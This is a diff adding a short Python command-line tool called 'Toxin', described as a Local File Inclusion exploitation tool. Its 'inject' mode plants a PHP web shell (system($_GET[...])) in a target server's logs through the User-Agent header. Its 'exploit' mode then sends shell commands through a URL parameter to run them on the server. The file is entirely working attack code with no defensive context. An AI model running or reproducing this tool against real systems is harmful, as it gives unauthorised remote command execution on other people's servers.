@@ -1,0 +1,41 @@
+#!/usr/bin/env python
+
+from pydoc import pager
+import requests
+import click
+
+
+@click.command(help='Toxin: Local File Inclusion Exploitation Tool')
+@click.option('--app_type', '-t', help='Application Type')
+@click.option('--url', '-u', help='URL to query')
+@click.option('--parameter', '-p',
+              help='Parameter to inject into User-Agent header')
+@click.option('--command', '-c', help='Command to Run')
+@click.option('--mode', '-m', help='Mode (Inject or Exploit)')
+@click.option('--paged', '-g', is_flag=True, help='Paged Output')
+def toxin(app_type, parameter, url, command, mode, paged):
+
+    if app_type == 'php':
+        headers = {'User-Agent': "<?php system($_GET['%s']); ?>" % parameter}
+    elif app_type is None:
+        pass
+    else:
+        raise RuntimeError('Invalid App Type Specified')
+
+    if mode == 'inject':
+        response = requests.get(url, headers=headers)
+    elif mode == 'exploit':
+        response = requests.get('{0}&{1}={2}'.format(url, parameter, command))
+    elif mode is None:
+        pass
+    else:
+        raise RuntimeError('Invalid Run Mode')
+
+    if paged is True:
+        pager(response.text)
+    else:
+        print(response.text)
+
+
+if __name__ == '__main__':
+    toxin()
